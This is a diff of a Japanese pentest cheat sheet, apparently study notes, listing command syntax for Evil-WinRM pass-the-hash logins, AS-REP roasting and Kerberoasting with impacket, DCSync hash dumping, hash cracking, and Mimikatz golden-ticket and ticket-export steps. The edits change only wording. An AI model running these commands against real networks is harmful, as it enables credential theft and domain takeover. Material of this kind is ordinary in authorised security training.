@@ -4,13 +4,13 @@
 - [enum4linux](https://github.com/CiscoCXSecurity/enum4linux) (kali〇, Perl)  
   「`enum4linux` IPアドレス」
 - [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) (kali〇, Ruby)  
-  「`evil-winrm` -i IPアドレス -u ユーザ名 -H NTハッシュ」でWinRM経由でログインできる。
+  「`evil-winrm` -i IPアドレス -u ユーザ名 -H NTハッシュ」WinRM経由でログインできる。
 - ftp (kali〇, ELF)  
   「ftp IPアドレス -a」Anonymousログオン
 - [GoBuster](https://github.com/OJ/gobuster) (kali〇, Go)  
   「`gobuster` -u URL -w wordlist dir」URL配下のコンテンツをWordlistを用いて探索
 - gpg (kali〇, ELF)    
-  「`gpg` --import "GPG鍵(拡張子.key)"」→「`gpg` -d "メッセージファイル(拡張子.gpg)"」でGPGファイルを復号
+  「`gpg` --import "GPG鍵(拡張子.key)"」→「`gpg` -d "メッセージファイル(拡張子.gpg)"」GPGファイルを復号
 - [hashcat](https://github.com/hashcat/hashcat) (kali〇, C)  
   「`hashcat` -a 0 -m 値 Hashファイル Wordlist」  
   「-a 0 」は辞書攻撃、「-m 値」はハッシュ形式（-m 13100 は「$krb5tgs」、-m 18200 は「$krb5asrep」）
@@ -20,16 +20,16 @@
   `impacket-〇〇`以外に、`python3 /usr/share/doc/python3-impacket/examples/〇〇.py`でも実行できる
   - GetNPUsers  
     - 「`impacket-GetNPUsers` -no-pass -dc-ip ドメコンIP ドメイン名/ユーザ名 -outputfile 出力ファイル名」  
-      で`ASREPRoast`（Kerberos事前認証を必要としていないユーザのTGTを取得できる）を実行  
+      `ASREPRoast`（Kerberos事前認証を必要としていないユーザのTGTを取得できる）を実行  
       取得したTGTを「john --wordlist=Wordlist名 TGT名」または「hashcat -a 0 -m 18200 wordlist名 TGT名 」でクラックできる  
     - 「`impacket-GetNPUsers` -no-pass -dc-ip ドメコンIP -userfile ユーザリスト ドメイン名/ -outputfile 出力ファイル名」  
       では「-userfile」内の各ユーザに対してASREPRoastを実行
   - GetUserSPNs  
     「`impacket-GetUserSPNs` -dc-ip ドメコンIP ドメイン名/ユーザ名:パスワード -outputfile 出力ファイル名」  
-    でKerberoasting（取得したユーザのSPNに対応したアカウントのTGSを取得できる）を実行
+    Kerberoasting（取得したユーザのSPNに対応したアカウントのTGSを取得できる）を実行
   - secretsdump  
     「`impacket-secretsdump` -just-dc ドメイン名/ユーザ名:パスワード@IPアドレス -outputfile 出力ファイル名」  
-    でDCSync権限を持つドメインユーザを使用して、各ドメインユーザのNTハッシュやKerberosキーをダンプできる。
+    DCSync権限を持つドメインユーザを使用して、各ドメインユーザのNTハッシュやKerberosキーをダンプできる。
 - [John the Ripper](https://github.com/openwall/john) (kali〇, C)  
   - 「`john` --wordlist=/usr/share/wordlists/rockyou.txt "Hashファイル" --format=Hash方式」  
     「`john` "Hashファイル名" --show」クラック済み結果を表示（もしくは`/home/kali/.john/.john.pot`に解析結果がある）
@@ -52,9 +52,9 @@
   「privilege::debug」→「[output '20' OK]」でAdministrator権限を確認
   - Golden/Silver Ticket Attacks  
     「lsadump::lsa /inject /name:krbtgt」  
-    でkrbtgtアカウントのNTハッシュやSIDをダンプ（SilverTicketの場合は/nameで指定のユーザを指定）  
+    krbtgtアカウントのNTハッシュやSIDをダンプ（SilverTicketの場合は/nameで指定のユーザを指定）  
     「Kerberos::golden /user:Administrator /domain:ドメイン名 /sid:krbtgtのSID /krbtgt:krbtgtのNTハッシュ /id:500」  
-    でGoldenTicketを作成（SilverTicketは別の方法）  
+    GoldenTicketを作成（SilverTicketは別の方法）  
     「misc::cmd」で先程作成したTicketに昇格する
   - Pass the Ticket  
     「sekurlsa::tickets /export」.kiribiチケットが現在地にエクスポート  
